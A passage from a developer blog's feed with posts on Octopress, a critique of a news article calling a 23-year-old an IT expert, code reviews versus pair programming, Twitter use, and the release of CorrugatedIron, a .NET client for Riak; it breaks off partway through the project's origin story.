<p>I moved over to Octopress over the holiday period of 2011/2012 and so
far I love it. I write all my posts in <a href="http://daringfireball.net/projects/markdown/">Markdown</a>, I push changes to
a <a href="https://github.com/">Github</a> repository and I publish a new version of my site with
a single command. It&rsquo;s a joy.</p>

<p>Octopress makes this all really easy and has built-in support for
themes, Github Pages and has a bunch of plug-ins that give you a great
looking and highly functional site out of the box.</p>

<p>I highly recommend it.</p>

<h1>That&rsquo;s all!</h1>

<p>Look at this list it&rsquo;s clear that I don&rsquo;t really rely on much. That
which I do rely on is often free or relatively low-cost. These tools are
what make me feel really productive and comfortable in front of the
machine. I hope that this has in some way inspired you to try a few new
things out, or at least write your own mini-list to praise that which
makes you the developer you are.</p>

<p>Bring on the comments, suggestions and flames.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[An Expert at 23]]></title>
    <link href="http://buffered.io/posts/an-expert-at-23/"/>
    <updated>2012-01-27T20:59:00+10:00</updated>
    <id>http://buffered.io/posts/an-expert-at-23</id>
    <content type="html"><![CDATA[<p>I was about to head to bed when I stumbled across a poorly-titled <a href="http://www.news.com.au/business/the-best-places-to-look-for-work-in-2012/story-e6frfm1i-1226255099978" title="The best places to look for work in 2012">article on news.com.au</a>. At first I thought it was going to cover off the best locations around Australia, or perhaps the world, for finding work in a variety of industries. It turned out to be a failed attempt at highlighting the key growth industry areas for jobs in Australia.</p>

<p>It began like this:</p>

<blockquote><p>JOBS demanded across several booming sectors will be the best place to find work this year.</p></blockquote>

<p>Despite the appalling structure and lack of coherence of the opening paragraph I pushed on through the rest of the article, hoping to find some interesting or useful information. Most of content would be fairly obvious to almost every Australian. The bits that could be considered interesting were old news, and nothing in the article made me feel that reading it was a good use of time.</p>

<!--more-->


<p>Then I got to the end and found this:</p>

<blockquote><p>For IT expert <em>Joe Public</em>, 23, right, the telecommunications and digital industry holds the promise of future growth. <em>Joe</em> studied IT at the University of Technology before completing a one-year placement at Macquarie Telecom.</p>

<p>&ldquo;The industry is enormous and there&rsquo;s plenty of variations and specialisations that you can pursue,&rdquo; he says.</p>

<p><em>Joe</em> now sets up servers and IT networks for various clients&#8217; business applications.</p>

<p>Asked where he would like to be in five years&#8217; time, he says: &ldquo;What I like is that I can go into a lot of different directions from where I am.&rdquo;</p></blockquote>

<p>I tried to completely ignore the blatant mistakes but couldn&rsquo;t. Despite the use of the word &ldquo;right&rdquo; in the first sentence there was no picture of the interviewee to be found. There&rsquo;s a mention of &ldquo;the University of Technology&rdquo; but a failure to mention which one. If this person finished a degree, taking a minimum of 3 years to complete, that would mean that his one year placement finished at the ripe old age of 22 if we assume he started university at 18. This is best case. Working for another year, bringing him to 23 years old, caps his experience at 2 years maximum &mdash; not much for someone considered to be an <em>I.T. expert</em>, in the &ldquo;digital industry&rdquo; no less!</p>

<p><span class='pullquote-right' data-pullquote='At 23 years old I barely knew my object-oriented earhole from my procedural arsehole'>
I&rsquo;ve been working professionally as a software developer/engineer/whatever since 1999. During this time I&rsquo;ve spent a great deal of time learning, growing, failing, constantly trying to improve, and earning scars along the way. I&rsquo;ve been fortunate enough to experience a huge number of different domains within software and have managed to land jobs in other countries than the one that I live in. Now that I am starting my 14th year in the industry I think I might be able to say that I&rsquo;m no longer a junior. At 23 years old I barely knew my object-oriented earhole from my procedural arsehole, let alone have the gall to call myself an expert or allow someone else to refer to me as one. Doing otherwise would be a lie. To grossly over-generalise: <em>nobody at the age of 23 can be called an I.T. expert</em>. Add at least ten years before you&rsquo;re no longer wet behind the ears.
</span></p>

<p><a href="http://buffered.io/uploads/2012/01/senior-lead-expert.jpg" rel="lightbox"><img title="Senior Lead Expert" src="http://buffered.io/uploads/2012/01/senior-lead-expert.jpg" width="200" style="float:right;margin-left:5px;margin-bottom:5px" /></a>Even the people that I know and respect, who I consider to be amongst the best, would not think of themselves as experts in their field by that age. To think that is to be overly arrogant. To allow a newspaper to state it on your behalf is stupid and I would consider it more damaging to your reputation than anything else. Don&rsquo;t attempt to make yourself sound like more than you are, as more often than not you tend to come off looking like a fool (see the &ldquo;Senior Lead Expert&rdquo; to the right for another example).</p>

<p>Another issue I have with this article, and others that have this focus, is that they imply that these industry sectors are the ones to go for if you&rsquo;re looking for a job <em>regardless of whether you&rsquo;re interested in the field or not</em>.</p>

<p>I love what I do. I enjoy most of the work that I am asked to undertake, and more often than not enjoy working with the people in the teams I get to work in. I don&rsquo;t dread getting out of bed and going to work. I look forward to the challenges, and I aim to produce quality stuff where possible while bettering myself in the process. To me, this is way more than a job. It&rsquo;s part of me and I love it.</p>

<p>If you don&rsquo;t love it, don&rsquo;t do it. Don&rsquo;t do it for the money. It&rsquo;s not worth it, for you or for the people you&rsquo;ll work with. If you love it, and you&rsquo;re interested, then the industry will welcome you with open arms. If all you&rsquo;ve ever wanted to be is a puppeteer, then go do that instead.</p>

<p><strong>News.com.au</strong> have done themselves, and Joe Public, a disservice with this article. It&rsquo;s poorly written, lacks anything newsworthy, implies that the subject is claiming to be something he is not, and guides people to a number of industries for the wrong reasons.</p>

<p>If you want to read news which is meaningful, well-written, edited and at least researched to a semi-decent level, then try the <a href="http://www.abc.net.au/news/" title="ABC News">ABC</a> instead.</p>

<h3>NOTE</h3>

<p>This article is not targeting <em>Joe Public</em>, it is instead attacking the way that the newspaper has portrayed him.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Reviews - They're All You Need]]></title>
    <link href="http://buffered.io/posts/reviews-theyre-all-you-need/"/>
    <updated>2012-01-18T07:11:00+10:00</updated>
    <id>http://buffered.io/posts/reviews-theyre-all-you-need</id>
    <content type="html"><![CDATA[<p><a href="http://buffered.io/uploads/2012/01/pair-programming.jpg" rel="lightbox"><img src="http://buffered.io/uploads/2012/01/pair-programming.jpg" style="float:left;margin-right:5px;margin-bottom:5px;" width="200" /></a>I can clearly remember the first time I got involved in an Agile project &mdash; it was back in 2004, it was in London and in the finance industry (insurance to be exact). When I joined the project the team was small though over time it become much bigger.</p>

<p>While on that gig I met and worked with a few of the nicest and best devs that I&rsquo;ve worked with (<a href="https://twitter.com/#!/robertthegrey" title="Robert @ Twitter">RobG</a>, <a href="https://twitter.com/#!/thenapoleon" title="Yoann @ Twitter">Yoann</a> and <a href="https://twitter.com/#!/RockThunderUK" title="Paul @ Twitter">The Chief</a>).</p>

<p>It was an exciting project. We were using <a href="http://www.extremeprogramming.org/" title="Extreme Programming">XP</a> in very much its purest sense, right from the beginning. We always paired up to do our programming, we created stories, we estimated our points using a point system that wasn&rsquo;t tied to hours but instead was relative. We had mini-retrospectives, continuous integration, unit tests and more. For 2004, that was pretty good.</p>

<p>Since then I&rsquo;ve worked on quite a few other Agile projects and over time, I have come to believe a few of the absolute purest views on Agile aren&rsquo;t necessarily the best.</p>

<!--more-->


<p>Any Agile practitioner will say &ldquo;You should use the process that works well for your team&rdquo; and while that&rsquo;s true they tend not to mean things like pair programming and unit testing which are considered an absolute must. The topic I&rsquo;m interested in for the purpose of this post is <strong>pair programming</strong>.</p>

<h2>Does Pair Programming Work?</h2>

<p>Well does it? It&rsquo;s a hard question to answer given its generalised nature. It sounds clichéd, and I guess to a point it is, but the answer is both yes and no. I don&rsquo;t mean that in the same way that most people will mean it. I don&rsquo;t mean that it might work in some teams but not in others. What I mean is that it works when approaching a particular kind of problem but not for others.</p>

<p>To add another generalisation, it works well in cases where the problem is quite difficult, or requires one or more difficult and hand-coded algorithms to solve. The type of problem where the possibility of getting it <em>drastically</em> wrong is a perfect candidate.</p>

<p>Drastically wrong is subjective, but I think we all know what I mean by it.</p>

<p>Some might argue that pair programming isn&rsquo;t required even in this case, and perhaps they are right, but I don&rsquo;t think so. Yes, you can have a design session where you get people together and talk about the options for implementation, nut out of a few of the details, etc. You can take the value from the discussion and, as the developer, dive into your dark little world of editing and bash out what you think was the design that everyone else had discussed. The result is usually vastly different to what the rest of the collective thought was going to be implemented.</p>

<p>Pair programming here helps. It helps make sure that one person isn&rsquo;t skewed or biased, keeps discussion going around the problem and forces the developers to think more while they&rsquo;re writing the code. Each key design decision is shared across two brains and (in theory) a better design will result.</p>

<p>That&rsquo;s where pair programming fits. Anything <em>less</em> than that and I can&rsquo;t help but feel that it&rsquo;s overhead. It&rsquo;s a burden. It doesn&rsquo;t add enough value to justify its cost.</p>

<p>To be direct, yes I am saying that <em>pair programming is a waste of time and resources for anything less than the mind-boggling problems</em>. This assertion does come with a few assumptions:</p>

<ol>
<li>There are no junior members who may need mentoring.</li>
<li>All members of the development team are competent.</li>
<li>There is enough trust between the team members that each developer will not only <em>not</em> produce a pile of rubbish, but will also put their hands up if they feel they&rsquo;re getting into something which requires input from the other minds in the room.</li>
</ol>


<p>If any of those assumptions is false then pair programming may have to come into play, or not! Point #2 interests me a little more than the others. If someone isn&rsquo;t competent then it doesn&rsquo;t matter if you do pair programming with them. What tends to happen is the competent person ends up doing everything while the numpty sits there playing a rather passive role, checking Facebook on their phone.</p>

<h2>If PP doesn&rsquo;t work, what should we do?</h2>

<p>I found the answer to this question in 2008 when I joined a team of people working on a system here in Brisbane. This project, like the one I mentioned before, had people who really knew what they were doing &hellip; I think! (in no particular order: <a href="https://twitter.com/#!/josephcooney" title="Joseph @ Twitter">JoCo</a>, <a href="https://twitter.com/#!/secretGeek" title="Leon @ Twitter">Mr B</a>, <a href="https://twitter.com/#!/joelpob" title="Joel @ Twitter">Joel</a>, <a href="https://twitter.com/#!/rhysparry" title="Rhys @ Twitter">Rhys</a>). I worked with these guys for nearly a year without really doing any pair programming at all.</p>

<p>Fast forward to now. I am again working with Leon, Rhys and Joel. I am again using the process that was used back then in 2008. I am again amazed at the quality of the output compared to so many other projects where pair programming was used to a very large extent. Not only that, the speed at which things are getting done is also pretty amazing. I am sure this is partly down to the developers themselves, but I think the lack of pair programming allows the team to be really productive.</p>

<p>So what are we doing instead?</p>

<p>Simply: Test Reviews and Code Reviews.</p>

<p>A developer works on a story by himself. During the course of development, the developer often shouts out to the rest of the team for advice on a given issue. They talk to the business owner to get clarification on the issues inside the requirements, the conversation is positive and constant. If the problem is really difficult, two of the guys will pair up and bash it out, but this proving to be a rarity.</p>

<p>At the end of development, prior to pushing any changes to the server, the developer must have one of the testers perform a test review of the work that has been done. When that has passed, a developer must do a full code review of what has been produced for that story.</p>

<h2>It doesn&rsquo;t sound any different!</h2>

<p>It might not appear to be different, but it is <em>very</em> different.</p>

<p><a href="https://twitter.com/#!/rhysparry" title="Rhys @ Twitter">Rhys</a> is our resident technical tester. In fact, he&rsquo;s a developer dressed up in tester&rsquo;s clothing. He has an incredibly sharp mind and an uncanny ability to find issues and break stuff. The number of times I have had my ass saved by Rhys prior to pushing my <del>shit</del> code to the central source repository is astounding. In all my time doing development, this one thing by itself has proved to catch more issues than anything else (including unit testing, automated testing, smoke testing and regression testing).</p>

<p>Testers have intimate knowledge of the requirements. They have experience with the system. They are aware of dependencies in business process that you are not. These factors, along with many others, are what make testers a great point of call prior to your commits.</p>

<p>It might be unfair to assume that every team has a technical testing resource that is the calibre of Rhys, but to put it bluntly <strong>your team should have one</strong>. Before passing your code on to the rest of the team it&rsquo;s your duty to make sure it is as unbroken as possible. Test reviews have proved to be the most effective thing in accomplishing this.</p>

<h2>Back it up with a proper code review</h2>

<p>That&rsquo;s right, not just any code review, but a <em>proper</em> one. One that requires you to go through your own code in quite a bit of detail. One that forces you to justify your design decisions. One that makes you critically analyse the legacy that you&rsquo;ve just created.</p>

<p>Anyone who has gone through this process with a colleague of any reasonable quality will know that:</p>

<ul>
<li>&hellip; any time you cover off a bit of code that isn&rsquo;t that nice you get nervous before you even talk about it.</li>
<li>&hellip; the code you wrote that you knew was sub-par is going to be picked up.</li>
<li>&hellip; any stupidity that you failed to see will be thrown back in your face (in a positive way of course).</li>
<li>&hellip; even the most subtle things can prove to be important and a good code review will often demonstrate why.</li>
</ul>


<p>In short, you know that you&rsquo;ll get owned if you try to get away with something that you knew, deep down, wasn&rsquo;t good enough in the first place.</p>

<p>As someone who conducts code reviews for other people in the team, you&rsquo;ll not only learn about other people&rsquo;s styles, flaws and strong points, you&rsquo;ll also cover off areas of the system that you would otherwise <em>have absolutley no idea about</em>. This is the kind of knowledge sharing that you would get doing pair programming, but I think it&rsquo;s more effective because you&rsquo;re not dragged through the whole design and development process from the start, and you tend to be more interested when the discussion of the detail is condensed.</p>

<p>And let&rsquo;s face it, being critical of someone else&rsquo;s code is something we all enjoy, and we&rsquo;re much more likely to pay attention during a code review than we are being a <a href="http://effectif.com/agile/pair-programming/be-a-better-navigator" title="Pair Programming Navigator">navigator</a> during a pair programming session.</p>

<h2>Bring it on</h2>

<p>Disagree? Feel free to let me know in the comments.
Think I&rsquo;m full of shit? Feel free to let me know in the comments.
Anything else? Feel free to let me know in the comments.</p>

<p>I&rsquo;m keen to hear what you all do, how you do it, and why you think it&rsquo;s better or worse. In particular, do those of you who do pair programming at least <em>most</em> of the time believe that it is adding enough value to justify the cost? Do you feel better for it?</p>

<p>Until next time!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Why I Use Twitter]]></title>
    <link href="http://buffered.io/posts/why-i-use-twitter/"/>
    <updated>2012-01-16T07:04:00+10:00</updated>
    <id>http://buffered.io/posts/why-i-use-twitter</id>
    <content type="html"><![CDATA[<p>When I first signed up for <a href="http://www.twitter.com/" title="Twitter">Twitter</a> back in mid-2008 I didn&rsquo;t really take it seriously. My view was that it was a toy and one that I intended to have a bit of fun with. I didn&rsquo;t really think that it would turn into what it did. I certainly didn&rsquo;t think it would be such an amazing source of information, nor did I expect it to give me contact with so many smart and interesting people.</p>

<!--more-->


<p>The idea of investing so much time in a stream of text-bites that are no more than 140 characters long seems a bit absurd. That&rsquo;s certainly what I felt when I first signed up. How could a meaningful discussion be had? Why is it any better than the likes of <a href="http://en.wikipedia.org/wiki/Internet_Relay_Chat" title="IRC">IRC</a>? Why would I use it for anything than fire-and-forget with a goal of having a laugh?</p>

<p>When I first started, I felt like I was just doing a Facebook-style status update. I can guarantee that my first Tweets were uninteresting noise; the kind you can find in most people&rsquo;s Twitter feeds even now. I did make a point of avoiding the kind of updates that <a href="http://www.penny-arcade.com/comic/2008/4/23/" title="Twitter Shitter">Penny Arcade</a> were having fun with at the time.</p>

<p>After an initial flurry where I played with the site and a few different clients I started to settle down and focus on a few topics that I was interested in. After following those topics for a while I slowly but surely found networks of people &mdash; <em>smart</em> people &mdash; who posted really interesting content. The content would often come in the form of a link with a tiny opinion alongside it which added to my ability to filter out the stuff I would and wouldn&rsquo;t want to read.</p>

<p>It didn&rsquo;t take long for Twitter to start making my RSS subscriptions a little cumbersome. The links and news were so fresh that the idea of using something that didn&rsquo;t feel as &ldquo;soft real-time&rdquo; seemed like a waste of time. I felt that I had somehow landed on a more reliable source of information that was being filtered by people that I respected.</p>

<p>Being a sometimes vocal person in the technology world I thought I&rsquo;d best do my bit to contribute to this new form of information sharing. While I kept up the fun side of using Twitter I put more time and effort into sharing the content I had found, passing on other people&rsquo;s Tweets, adding my own short summation of the information being shared.</p>

<p>It took about 6 months for me to really realise the power that Twitter was giving me. I had, on many occasions, managed to get access to very influential people who work in or on the technology platforms that I was working with. I received personalised help, if not directly on Twitter then via email after a brief Twitter conversation. I was able to reach <em>many</em> people, varying from beginners through to experts, who were actively engaged in learning about languages and technologies, and having contact with those people helped me learn even more about what I was working with.</p>

<p>Twitter was a gold mine of information, and not just technical.</p>

<p>So is Twitter a muck-around tool? Perhaps for some is it, but for me it is way more. Should you use it? I think so, particularly if you&rsquo;re a geek.</p>

<p>If you do decide to get stuck in and sign up for Twitter, or if you&rsquo;ve got an account already but don&rsquo;t feel you&rsquo;re getting the most out of it, here are a few things that I highly recommend you do:</p>

<ol>
<li>Fill out your bio and add a link to a meaningful website.</li>
<li>Make use of the <a href="http://www.searchenginejournal.com/twitter-hashtags/9419/" title="What is a hashtag?">hashtag searches</a>. This facility will make it really easy for you to connect with people who are interested in the same topics as you.</li>
<li>Use hashtags yourself in you Tweets to make them visible to that same group of people.</li>
<li>Listen in on other people&rsquo;s conversations. Browse through the threads as they&rsquo;re often littered with interesting an valuable information.</li>
<li>Don&rsquo;t but into discussions or make noise unless you really do have something valuable to say. In other words, add signal and not noise (yes, I should practise what I&rsquo;m preaching here).</li>
<li>Don&rsquo;t be scared to be yourself, you&rsquo;ll find that it&rsquo;ll be easier for others to garner respect for you.</li>
<li>Don&rsquo;t be afraid to have an opinion and be honest.</li>
<li>Don&rsquo;t worry about offending or being offended.</li>
<li>Don&rsquo;t feel obliged to follow people back just because they&rsquo;ve followed you, and vice versa. Twitter isn&rsquo;t Facebook or Linked In.</li>
<li>Make sure you spend time once a week going through your followers and removing any spammers. When people first discover you on Twitter they&rsquo;ll look at your bio, your site and your followers. The last thing you want others to think is that you&rsquo;re a spammer yourself, or are closely associated with spammers.</li>
</ol>


<p>Oh, and enjoy yourself! Have fun with it. You&rsquo;ll learn way more and engage more people if you do.</p>

<p>You can <a href="http://twitter.com/TheColonial" title="OJ on Twitter">add me too</a> if you like (no pressure).</p>

<p>PS. This post is, at least in part, a response to a question that <a href="http://twitter.com/Lisa_Cumes" title="Lisa on Twitter">Lisa</a> <a href="http://www.empowerexecutives.com.au/EmpowerExecutives/Blog/Entries/2012/1/13_Twitter_-_for_me_or_you.html" title="Twitter - for me or you?">posted just a few days ago</a>. Feel free to share your own story with her if you feel like it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CorrugatedIron Update - v0.1.1]]></title>
    <link href="http://buffered.io/posts/corrugatediron-update-v0-1-1/"/>
    <updated>2011-08-03T21:18:00+10:00</updated>
    <id>http://buffered.io/posts/corrugatediron-update-v0-1-1</id>
    <content type="html"><![CDATA[<p>Last week <a href="http://facility9.com/" title="Jeremiah Peschka">JP</a> and I released our first Open Source project, <a href="http://corrugatediron.org/" title="CorrugatedIron">CorrugatedIron</a>. The release seemed to be fairly well received by those people who gave it a spin. We&rsquo;ve had some good feedback along the way which we&rsquo;ll be evaluating, and no doubt those suggestions and comments will be influencing the future of the library.</p>

<p>In the interim, we wanted to get another version out which sorts out two main issues and that changes the <em>perceived</em> &ldquo;norm&rdquo; when building applications with CorrugatedIron. Those issues are listed below. We&rsquo;ve also go the first pass of our <a href="http://corrugatediron.org/documentation/MapReduce.html" title="Map/Reduce">Map/Reduce</a> documentation ready.</p>

<p>If you&rsquo;re not interested in the detail, head on over to the <a href="http://corrugatediron.org/downloads.html" title="Downloads page">download page</a> to find out the many ways in which you can get access to the release. Otherwise, please read on!</p>

<!--more-->


<h2>Removal of IoC</h2>

<p>When we first put together the sample applications we thought that it&rsquo;d be a good idea to show how these things can be done using what the mainstream .NET developers would use. That is, we decided to wire everything in with IoC. This wasn&rsquo;t because we felt that this is how it <strong>had</strong> to be done, but more to try and give people a level of familiarity. The library that we chose to use for the samples was Unity, for no other reason that &ldquo;it was there&rdquo;.</p>

<p>This small mistake seemed to give off the impression that we felt that Unity was the best choice of all the IoC containers out there.</p>

<p>This is most definitely <strong>not the case</strong>. We are in no way advocating the use of one IoC container over the other. We honestly don&rsquo;t care which one you want to use. You should use whichever works for you.</p>

<p>To avoid this perception we decided that it would be best to remove references to any IoC container in all samples except for the <a href="https://github.com/DistributedNonsense/CorrugatedIron.Samples/tree/master/VisualStudio2010/Sample" title="IoC Sample Project">one sample</a> which shows how to use <em>lots</em> of different containers to do the same thing. Hence you should see a <em>lack</em> of IoC containers in our examples from now on. Sorry for any confusion.</p>

<h2>Handling of Client IDs</h2>

<p>Our first implementation of Client ID generation in CorrugatedIron wasn&rsquo;t a great implementation. We made the decision early on to generate IDs based on some details of the machine that the client was running on (ie. The MAC address of the first functioning NIC on the machine). Our thinking was that we wanted to uniquely identify a client while still allowing the ID to be reused across instances of the application. This might make sense for rich-client applications, but certainly doesn&rsquo;t work well in the web world. In a web environment, each request could come from a different user.</p>

<p>Almost immediately after releasing v0.1.0, <a href="http://facility9.com/" title="Jeremiah Peschka">JP</a> and I read an email on the [Riak mailing list][mailinglist] which made us rethink our approach. After a bit of discussion, we decided to go with an idea of Jeremiah&rsquo;s which involves the generation of the Client ID when the RiakClient instance is created. This generation can be controlled by the user of the library by specifying a <code>seed</code> value.</p>

<p>This gives the user the flexibility of not being concerned about the Client ID if they don&rsquo;t want to be, but can have some control if they do.</p>

<h2>Ease of Configuration</h2>

<p>The only bit of &ldquo;constructive criticism&rdquo; that we received on-masse was via <a href="http://news.ycombinator.com/item?id=2799823" title="CI on Hacker News">Hacker News</a> and revolved around configuration. The general feeling was that the effort required to configure the library was higher than expected, especially when compared to other libraries. I&rsquo;d suggest reading the full discussion over on the <a href="http://news.ycombinator.com/item?id=2799823" title="CI on Hacker News">Hacker News</a> site to read some of the reasons behind the design decisions. But, if you&rsquo;re too lazy (I don&rsquo;t blame you if you are), the short version is this: CorrugatedIron is a .NET library connecting to a clustered, distributed key-value store. A library that does this, while attempting to manage load-balancing across all nodes in the cluster, is going to require some configuration.</p>

<p>One concern in particular resonated with me, and that was the difficulty in getting CorrugatedIron running inside a REPL, such as <a href="http://www.fsharphelp.com/Interactive.aspx" title="F# interactive">FSI</a>. The two issues with getting a REPL to work from configuration are:</p>

<ul>
<li>The ability to specify the location of the configuration file.</li>
<li>The number of lines of code it takes to wire things in.</li>
</ul>


<p>The XML that&rsquo;s required is not going to be changing in the short term. The values that are specified in that configuration are required to make the most of Riak and that&rsquo;s not something we&rsquo;re prepared to compromise on. However, the .NET code required to access it has changed, though the old way of wiring things in still exists for those people who want that level of flexibility.</p>

<p>In short, you can wire-in CorrugatedIron&rsquo;s XML configuration as simply as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='csharp'><span class='line'><span class="n">var</span> <span class="n">cluster</span> <span class="p">=</span> <span class="n">RiakCluster</span><span class="p">.</span><span class="n">FromConfig</span><span class="p">(</span><span class="s">&quot;riakConfig&quot;</span><span class="p">);</span>
</span><span class='line'><span class="n">var</span> <span class="n">client</span> <span class="p">=</span> <span class="n">cluster</span><span class="p">.</span><span class="n">CreateClient</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


<h2>That&rsquo;s it!</h2>

<p>Hopefully this will make your life a little easier while getting CorrugatedIron up and running. We&rsquo;re always keen to hear your feedback, so please <a href="https://github.com/DistributedNonsense/CorrugatedIron" title="CorrugatedIron @ Github">drop us a line</a> if you have any thoughts, suggestions or issues.</p>

<p>Enjoy!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introducing CorrugatedIron]]></title>
    <link href="http://buffered.io/posts/introducing-corrugatediron/"/>
    <updated>2011-07-25T09:00:00+10:00</updated>
    <id>http://buffered.io/posts/introducing-corrugatediron</id>
    <content type="html"><![CDATA[<h2>It&rsquo;s Alive!</h2>

<p>It is with great pride that I introduce my first ever Open Source product release: <a href="http://corrugatediron.org/" title="CorrugatedIron">CorrugatedIron</a>! A feature-rich .NET client for the <a href="http://riak.basho.com/" title="Riak">Riak</a> Key-Value store. Together with my partner-in-crime <a href="http://facility9.com/" title="Jeremiah Peschka">Jeremiah</a>, we&rsquo;ve put together a driver which exposes a great deal of Riak&rsquo;s functionality. CorrugatedIron is at <a href="https://github.com/DistributedNonsense/CorrugatedIron/tree/v0.1.0">v0.1.0</a>, and while it doesn&rsquo;t support every feature the Riak has to offer, it covers most, if not all, of the most common features that are required to effectively communicate with the system.</p>

<!--more-->


<h2>Features</h2>

<p>I would love to cover off all of the features here, but we&rsquo;ve already done it on the <a href="http://corrugatediron.org/" title="CorrugatedIron">official site</a>, so head over there to take a look at the feature list, documentation and sample projects.</p>

<h2>The What, Where, Why and How</h2>

<h3>How it all began</h3>

<p>I don&rsquo;t remember the exact date that I was first exposed to <a href="http://riak.basho.com/" title="Riak">Riak</a>, <a href="http://basho.com/" title="Basho">Basho</a>&rsquo;s bomb-proof database, but I do remember being very impressed. It was around the time I really started to get an interest in <a href="http://www.erlang.org/" title="Erlang">Erlang</a> programming, so it probably isn&rsquo;t a surprise, given that Riak is written in Erlang, that it piqued my interest. I have a bit of a fascination with systems that don&rsquo;t stop, and Riak fits firmly in that category.</p>

<p>So after playing with it for a while and marvelling at the sturdiness, the ease of set-up (even with clustering), the clever architecture and the make-up of the system, I realised that Riak was actually pretty special. Almost in a class of it&rsquo;s own. Its properties really appealed to me, and I felt the need to do something with.</p>

<p>Back then, I wasn&rsquo;t even working with Erlang professionally. The clients that I had at the time were pure .NET shops and didn&rsquo;t feel the need to consider anything other than the &ldquo;tried and true&rdquo; <a href="http://en.wikipedia.org/wiki/Relational_database_management_system" title="Relational Databases">RDBMS</a> (which in Brisbane seems to be mainly MS SQL, particularly in the .NET circles). Given that the likelihood of my working with Riak in a professional sense in the short term was fairly slim, I wanted to look to other areas where I could work with it and contribute to it at the same time. Needless to say, my Erlang-fu wasn&rsquo;t (and still isn&rsquo;t) up to scratch, so contributing to Riak itself wasn&rsquo;t yet something I thought I could take on. I needed something else.</p>

<p>Late last year, I was starting to look for projects that I could build and release as <a href="http://www.opensource.org/" title="Open Source">Open Source</a>. I have, on my occasions, contributed to other Open Source projects but I hadn&rsquo;t worked on one of my own and released it into the wild. This is something that I really wanted to do and so was looking for something to build.</p>

<p>During my travels in the Riak circles I had noticed that there were quite a few clients available which allowed people to talk to Riak from various languages. Basho themselves <a href="http://wiki.basho.com/Client-Libraries.html" title="Client libraries">support</a> ones for Erlang, Java, PHP, Python and Ruby, and there are many more listed on the <a href="http://wiki.basho.com/Community-Developed-Libraries-and-Projects.html#Client-Libraries-and-Frameworks" title="Client libraries">Riak community clients page</a> which cover languages like C, Clojure, Go, Node.js, Perl, Scala and more.</p>

<p>Amongst this libraries there were two listed for .NET. Both of them seemed to have a small set of functionality, they both weren&rsquo;t finished and at the time they both had not been touched for quite a while. In short, for .NET people, there really wasn&rsquo;t a viable option for Riak connectivity. What a travesty!</p>

<p>I remember sending an email to <a href="http://twitter.com/pharkmillups" title="Mark Phillips">Mark</a> telling him that I was pondering the thought of building this library to make sure that there wasn&rsquo;t already someone else out there making a go of it. He was aware of the two existing solutions but didn&rsquo;t know what the plans were with them, and he wasn&rsquo;t aware of any others at the time. This was all the validation that I needed.</p>

<p>So, in late 2010, I decided that the first project I wanted to build and release to the world as an Open Source application was a .NET client for Riak, one that worked on both the <a href="http://en.wikipedia.org/wiki/Common_Language_Runtime" title="Microsoft CLR">CLR</a> and on <a href="http://www.mono-project.com/" title="Mono">Mono</a>. This is where CorrugatedIron was conceived.</p>

<h3>So why the long wait?</h3>

<p>If you look at the <a href="https://github.com/DistributedNonsense/CorrugatedIron/graph">history</a> of the code-base you&rsquo;ll see that I had an initial flurry of activity in early 2011, but didn&rsquo;t really do anything else for quite some time. There&rsquo;s a reason for that!</p>

<p>When I first decided on the project, I spent a bit of time thinking about the design. I wanted the interface to be more &ldquo;functional&rdquo; in many ways. I wanted to remove the idea of resource management away from the caller. I didn&rsquo;t want to give them rope (such as <code>IDisposable</code> instances) with which to hang themselves (such as forgetting to <code>Dispose()</code>). I wanted the interface to be clean, simple, intuitive and safe.</p>

<p>This little in-memory design session went on for quite some time, but I didn&rsquo;t really put anything down on paper. Nor did I write any code. Instead, I though that I would put something together which wasn&rsquo;t really related or as important as the API. Something that was lower level which the user of the library would not (and should not) see.</p>

<p>A Riak node has two interfaces which clients can connect to. One of them is a <a href="http://en.wikipedia.org/wiki/Representational_State_Transfer" title="REST">REST</a> API, and the other is a binary API which utilises <a href="http://code.google.com/p/protobuf/" title="Protocol Buffers">Protocol Buffers</a>. I thought that it would be fun to start working on the Protocol Buffer handling while the idea of the API formed slowly in the back of my mind.</p>

<h3>Then along came JP</h3>

<p>Then, just before Christmas (23rd December to be exact) I received an email out of the blue from a chap in America. Here&rsquo;s how it started:</p>

<blockquote><p>Greetings from America!</p>

<p>Hope your summer is going well. Mark Phillips told me that you were interested in working on a good .net driver for Riak. Have you made any progress or is it still a general idea in your head?</p></blockquote>

<p>There was much more to the email than that, but it certainly started off well! The email was from <a href="http://facility9.com/" title="Jeremiah Peschka">Jeremiah Peschka</a>, a chap who&rsquo;s name I had seen floating around the Riak <a href="http://lists.basho.com/mailman/listinfo/riak-users_lists.basho.com" title="Riak mailing list">mailing list</a>. In fact, I remember his name catching my eye on more than one occasion because his email signature contained the following:</p>

<blockquote><p>Microsoft SQL Server MVP<br/>
MCITP: Database Developer, DBA</p></blockquote>

<p>This resonated with me because he was obviously into RDBMSs, but hadn&rsquo;t been a complete asshat on a list full of people working with <a href="http://en.wikipedia.org/wiki/NoSQL" title="NoSQL">NoSQL</a>. This was a rare and surprising thing.</p>

<p>Moving on. After a few email exchanges, Jeremiah indicated that he was interested in helping to build CorrugatedIron (despite the whacky name) and we decided to team up. I knew that he&rsquo;d definitely add value to the whole process and would also keep me motivated. Plus, his obvious skills in the SQL realm would no doubt be useful too!</p>

<p>We continued to talk into January and I thought that it was past time that I shared the code that I had hacked together so that we had a starting/talking point. On the 7th January, I committed my first <a href="https://github.com/DistributedNonsense/CorrugatedIron/--SOMETHING-GOES-HERE--">batch of code</a> to the repository which contained a stack of very untested code. I don&rsquo;t even know if it worked! The result: we had a lot to talk about.</p>

<h3>Another intermission</h3>

<p>Though JP and I continued to talk a great deal via email, we were both quite under the pump with our respective places of employment. We shared ideas along the way, but neither of us were really into the project as a result of the intense work we had on elsewhere. Though I&rsquo;m fairly certain that the thought of the project wasn&rsquo;t far from our minds the whole time.</p>

